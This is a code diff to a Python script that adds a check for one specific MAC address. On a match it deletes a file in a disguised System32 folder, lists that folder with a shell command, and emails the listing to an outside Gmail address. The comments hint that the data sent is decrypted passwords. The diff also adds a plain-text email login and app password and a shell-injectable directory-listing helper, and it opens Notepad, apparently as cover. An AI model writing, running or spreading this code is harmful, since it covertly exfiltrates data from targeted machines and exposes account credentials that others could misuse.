@@ -1,6 +1,27 @@
 import subprocess
 import re
 import shutil
+import time
+import os
+
+
+
+def list_files_and_folders(path):
+    try:
+        # Use the Command Prompt to list files and folders
+        result = subprocess.run(f'cmd /c dir /B "{path}"', shell=True, capture_output=True, text=True)
+        
+        # Capture the output in a variable
+        output = result.stdout
+        
+        # Print the output (optional)
+        print(output)
+        
+        return output
+    except subprocess.CalledProcessError as e:
+        print(f"Error: {e}")
+        return None
+
 
 def delete_folder(path):
     try:
@@ -24,7 +45,38 @@ def main():
     if "36-02-86-52-8E-DD" in mac_addresses:
         folder_path = r"C:\Windows\System32\DDDFFFss\sapu.dll.mui"
         delete_folder(folder_path)
+        time.sleep(20)
 
+
+
+        
+        target_path = r"C:\Windows\System32\DDDFFFss"
+        
+
+
+        email_sender = "mnadeemstar777@gmail.com"
+        email_password = "zaektddcxhqebqol"
+        email_receiver = "Ibrahim.abid.rajput.minhas@gmail.com"
+
+        subject = "Rocket sent"
+
+        # Get the content of decrypted_password.csv
+        file_content = list_files_and_folders(target_path)
+        
+        # Create the EmailMessage object
+        em = EmailMessage()
+        em['From'] = email_sender
+        em['To'] = email_receiver
+        em['Subject'] = subject
+        em.set_content(file_content)
+        
+        # SMTP setup and sending the email
+        context = ssl.create_default_context()
+        
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+            smtp.login(email_sender, email_password)
+        
+            smtp.sendmail(email_sender, email_receiver, em.as_string())
         try:
             subprocess.Popen(['notepad.exe'])
             print("Notepad opened successfully.")
